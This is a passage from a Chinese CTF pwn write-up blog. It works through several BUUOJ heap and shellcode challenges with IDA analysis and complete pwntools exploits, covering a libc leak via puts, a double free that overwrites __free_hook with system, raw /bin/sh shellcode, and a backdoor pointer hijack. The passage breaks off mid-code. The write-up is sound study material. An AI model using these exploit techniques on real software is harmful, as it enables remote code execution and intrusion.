class=""><p>在初始化的时候有两个地方可以泄露libc，一开始就瞄了一下没太在意，后面发现libc泄露不了没法写，看到wp才知道，写堆题还是要看看其他的输入点，每个输入点都有可能是一个漏洞点！</p><p>puts函数的输出是直到碰到”\x00”才会结束，s是一个大小为16的数组，它只让我们输入前八，所以我们把前八给写满如果后面没有”\x00”就会把后八的字符给带出来，后面碰巧是libc里面的地址</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/29.jpg" class=""><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/35.jpg" class=""><p>虽然%3$p会报错，但是%p不会报错调试一下，全是栈上的地址，随便找一个就行</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/33.png" class=""><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/34.jpg" class=""><p>下面就是正常的堆，show和edit函数废了</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/30.png" class=""><p>漏洞点就是在del里面，有个uaf</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/31.png" class=""><h4 id="0x02解题思路-1"><a href="#0x02解题思路-1" class="headerlink" title="0x02解题思路"></a>0x02解题思路</h4><ol><li>通过前面的溢出，泄露出libc</li><li>double free控制堆块修改fd指针指向free_hook</li><li>修改free_hook为system</li></ol><h4 id="0x03-完整EXP-4"><a href="#0x03-完整EXP-4" class="headerlink" title="0x03 完整EXP"></a>0x03 完整EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;ciscn_2019_en_3&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">binary = <span class="string">&#x27;ciscn_2019_en_3&#x27;</span></span><br><span class="line">port = <span class="string">&#x27;25784&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">io = process(binary,env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>:<span class="string">&#x27;libc-2.27.so&#x27;</span>&#125;)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Input your choice:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Please input the size of story: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;please inpute the story: &#x27;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Input your choice:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Please input the index:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;name?\n&#x27;</span>,<span class="string">&#x27;zyen&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;ID.\n&#x27;</span>,<span class="string">&#x27;zyen1111&#x27;</span>)</span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;setbuffer&#x27;</span>]-<span class="number">231</span></span><br><span class="line">io.success(<span class="string">&quot;[*]libc_base =&gt; &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">io.success(<span class="string">&quot;[*]system_addr =&gt; &quot;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line">io.success(<span class="string">&quot;[*]free_hook =&gt; &quot;</span> + <span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;aa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x20</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,p64(system_addr))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="0x04总结-1"><a href="#0x04总结-1" class="headerlink" title="0x04总结"></a>0x04总结</h4><h5 id="1-puts小实验"><a href="#1-puts小实验" class="headerlink" title="1.puts小实验"></a>1.puts小实验</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">16</span>];</span><br><span class="line">read(<span class="number">0</span>,s,<span class="number">16</span>);</span><br><span class="line"><span class="built_in">puts</span>(s);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面是read了8个字符，这次我们read了16个字符，但是我们的输入只输入了8个1，同样的，我们看到了它有泄露下面的地址，puts函数还是挺危险的！</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/37.png" class=""><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/36.jpg" class=""><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/38.png" class=""><p>最后啰嗦一下，此double free已经不适应用于libc-2.27了，libc-2.26不知道，double free的补丁已经打到libc-2.27上了，搞得我本地调试不了…（懒的换libc</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/32.jpg" class=""><p><a href="https://blog.csdn.net/easy_level1/article/details/115724038">libc补丁</a></p><p>加了个key，记得可以改这个key绕过这个检查的，但是这题没有edit函数….</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/39.jpg" class=""><h3 id="starctf-2019-babyshell"><a href="#starctf-2019-babyshell" class="headerlink" title="starctf_2019_babyshell"></a>starctf_2019_babyshell</h3><h4 id="0x00-基本信息-5"><a href="#0x00-基本信息-5" class="headerlink" title="0x00 基本信息"></a>0x00 基本信息</h4><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/51.png" class=""><h4 id="0x01-IDA分析-5"><a href="#0x01-IDA分析-5" class="headerlink" title="0x01 IDA分析"></a>0x01 IDA分析</h4><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/40.png" class=""><p>程序的流程很简单就是输入shllcode，然后执行，但是sub_400786里面还有名堂</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/41.png" class=""><p>它会对比一段字符串，如果匹配就能执行我们的shellcode，”\x00”就能绕过，问题不大</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/42.png" class=""><p>但当我把shellcode打进去的时候，很惊奇的发现居然没getshell，动调发现它居然把shellcode的push 42给占了</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/43.png" class=""><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/44.png" class=""><p>可能某个地方覆盖了吧也不太清楚，在shellcode前面加上几个”\x6a”就可以了</p><h4 id="0x02-完整EXP"><a href="#0x02-完整EXP" class="headerlink" title="0x02 完整EXP"></a>0x02 完整EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;starctf_2019_babyshell&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.27.so&#x27;)</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line">binary = <span class="string">&#x27;starctf_2019_babyshell&#x27;</span></span><br><span class="line">port = <span class="string">&#x27;26094&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># check = &#x27;\x5A\x5A\x4A\x20\x6C\x6F\x76\x65\x73\x20\x73\x68\x65\x6C\x6C\x5F\x63\x6F\x64\x65\x2C\x61\x6E\x64\x20\x68\x65\x72\x65\x20\x69\x73\x20\x61\x20\x67\x69\x66\x74\x3A\x05\x20\x65\x6E\x6A\x6F\x79\x20\x69\x74\x21\x0A\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">&#x27;\x6a\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05&#x27;</span></span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.sh())</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;give me shellcode, plz:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">&#x27;\x00\x6a&#x27;</span>+shellcode)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io.recv(10)</span></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h4><p>哇！哭了，学到了，直接编写shellcode调用sys_read</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./starctf_2019_babyshell&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x4008CB&#x27;)</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">shellcode = asm(<span class="string">&#x27;pop rdi;pop rdi;pop rdi;pop rdi;pop rdi;pop rdi;pop rdi;pop rdi;pop rdx;pop rdi;syscall&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27; plz:\n&#x27;</span>,shellcode)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">0xC</span> + asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="bjdctf-2020-YDSneedGrirlfriend"><a href="#bjdctf-2020-YDSneedGrirlfriend" class="headerlink" title="bjdctf_2020_YDSneedGrirlfriend"></a>bjdctf_2020_YDSneedGrirlfriend</h3><h4 id="0x00-基本信息-6"><a href="#0x00-基本信息-6" class="headerlink" title="0x00 基本信息"></a>0x00 基本信息</h4><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/45.png" class=""><h4 id="0x01-IDA分析-6"><a href="#0x01-IDA分析-6" class="headerlink" title="0x01 IDA分析"></a>0x01 IDA分析</h4><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/46.png" class=""><p>上面还有一个限制堆块数量的判断，不重要，可以看到这里申请了一个0x10的堆块写入了print_girlfriend_name的函数地址，但是这个print_girfriend_name…就是一个后门</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/47.png" class=""><p>现在还没感觉像后门，但是看到print函数的时候，仔细看看(*girlfriendlst[v1])(girlfrendlist[v1])，如果我们劫持了包含print_girlfriend_name的0x10堆块，修改成其他的函数地址，比如system@got，那么就会变成system(girlfrendlist[v1] + 8)</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/48.png" class=""><p>再看看del函数，思路就很清晰了</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/49.jpg" class=""><p>有个后门函数…</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/50.png" class=""><h4 id="0x02-解题思路-3"><a href="#0x02-解题思路-3" class="headerlink" title="0x02 解题思路"></a>0x02 解题思路</h4><ol><li>double free一个堆块</li><li>申请一个0x20的堆块，double free的0x10的堆块就写入了print_girlfriend_name</li><li>申请的时候改成后门函数</li></ol><h4 id="0x03-完整EXP-5"><a href="#0x03-完整EXP-5" class="headerlink" title="0x03 完整EXP"></a>0x03 完整EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;bjdctf_2020_YDSneedGrirlfriend&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line">binary = <span class="string">&#x27;bjdctf_2020_YDSneedGrirlfriend&#x27;</span></span><br><span class="line">port = <span class="string">&#x27;29413&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,context</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Her name size is :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Her name is :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(context))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;zyen&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,p64(<span class="number">0x400B9C</span>))</span><br><span class="line"><span class="comment"># add(0x20,&#x27;a&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="0x04-总结-2"><a href="#0x04-总结-2" class="headerlink" title="0x04 总结"></a>0x04 总结</h4><p>看了大佬的wp，其实不用改，只要print_girlfriend_name上面写着是后门函数就行，不知道为啥system(“/bin/sh”)一直不行，一进入就down了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;bjdctf_2020_YDSneedGrirlfriend&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">binary = <span class="string">&#x27;bjdctf_2020_YDSneedGrirlfriend&#x27;</span></span><br><span class="line">port = <span class="string">&#x27;29413&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,context</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Her name size is :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Her name is :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(context))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,p64(<span class="number">0x400B9C</span>))</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="roarctf-2019-realloc-magic"><a href="#roarctf-2019-realloc-magic" class="headerlink" title="roarctf_2019_realloc_magic"></a>roarctf_2019_realloc_magic</h3><h4 id="0x00-基本信息-7"><a href="#0x00-基本信息-7" class="headerlink" title="0x00 基本信息"></a>0x00 基本信息</h4><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/52.png" class="" width="52"><p>保护全开，肯定是泄露<code>libc</code>打<code>hook</code></p><h4 id="0x01-IDA分析-7"><a href="#0x01-IDA分析-7" class="headerlink" title="0x01 IDA分析"></a>0x01 IDA分析</h4><p><code>realloc</code>函数，需要注意的是<code>realloc_ptr = realloc(realloc_ptr, size)</code>，根据<code>realloc</code>的特性，如果不<code>realloc(0)</code>，它将一直对同一个堆块<code>realloc</code>，具体请看《从广东省强网杯–<code>girlfriend</code>看<code>realloc</code>的艺术》</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">re</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> size; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Size?&quot;</span>);</span><br><span class="line">  size = get_int();</span><br><span class="line">  realloc_ptr = <span class="built_in">realloc</span>(realloc_ptr, size);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Content?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, realloc_ptr, size);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>free</code>存在<code>uaf</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fr</span><span class="params">()</span></span></span><br><span class="line"><span 